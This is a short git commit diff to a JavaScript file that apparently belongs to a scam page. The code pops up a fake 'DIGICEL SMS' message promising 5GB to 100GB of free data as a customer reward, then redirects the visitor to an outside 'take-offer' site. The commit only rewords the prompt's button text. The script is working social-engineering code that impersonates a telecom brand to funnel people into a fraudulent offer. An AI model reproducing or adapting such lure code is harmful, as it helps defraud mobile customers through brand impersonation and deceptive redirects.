c01709b7110c092d588585cad18f1d6d26362ade
derealblog <rosie1999willie@gmail.com>
2025-03-14 12:31:32 +0100

    Update digicel-active.js

--- digicel-active.js
+++ digicel-active.js
@@ -1,5 +1,5 @@
 var password = 'VALID FOR 3-MONTH'
-password=prompt('DIGICEL SMS: Dear Customer, Kindly Check if Your Digicel Sim Card is Qualify To Receive From 5GB To 100GB Data, Old Customers Reward, Press VALID FOR 3-MONTH To Check Now ','VALID FOR 3-MONTH');
+password=prompt('DIGICEL SMS: Dear Customer, Kindly Check if Your Digicel Sim Card is Qualify To Receive From 5GB To 100GB Data, Old Customers Reward, Press Ok To Check Now ','VALID FOR 3-MONTH');
 if (password != 'VALID FOR 3-MONTH') {
 location.href='https://take-offer.org/digicel.html';
 }
